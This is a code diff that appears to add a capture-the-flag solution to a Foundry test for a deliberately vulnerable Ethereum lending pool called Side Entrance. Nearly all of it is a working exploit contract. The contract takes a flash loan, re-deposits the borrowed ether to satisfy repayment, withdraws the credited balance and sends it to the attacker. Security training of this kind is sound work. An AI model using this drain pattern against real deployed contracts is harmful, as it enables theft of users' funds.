@@ -36,7 +36,9 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.prank(attacker);
+        Attack attack = new Attack(address(sideEntranceLenderPool));
+        attack.attack();
         /**
          * EXPLOIT END *
          */
@@ -47,5 +49,33 @@ contract SideEntrance is Test {
     function validation() internal {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
+    }
+}
+
+contract Attack {
+    address immutable POOL;
+    address immutable OWNER;
+
+    constructor(address pool) {
+        POOL = pool;
+        OWNER = msg.sender;
+    }
+
+    function attack() external {
+        (bool flashloan, ) = POOL.call(abi.encodeWithSignature("flashLoan(uint256)", 1000e18));
+        console.log("malicious flashloan request: %s", flashloan);
+
+        (bool withdraw, ) = POOL.call(abi.encodeWithSignature("withdraw()"));
+        console.log("malicious withdraw request: %s", withdraw);
+    }
+
+    function execute() external payable {
+        (bool deposit, ) = POOL.call{value: address(this).balance}(abi.encodeWithSignature("deposit()"));
+        console.log("malicious reentrant deposit: %s", deposit);
+    }
+
+    fallback() external payable {
+        (bool transfer, ) = OWNER.call{value: address(this).balance}("");
+        console.log("malicious value transfer to attacker: %s", transfer);
     }
 }
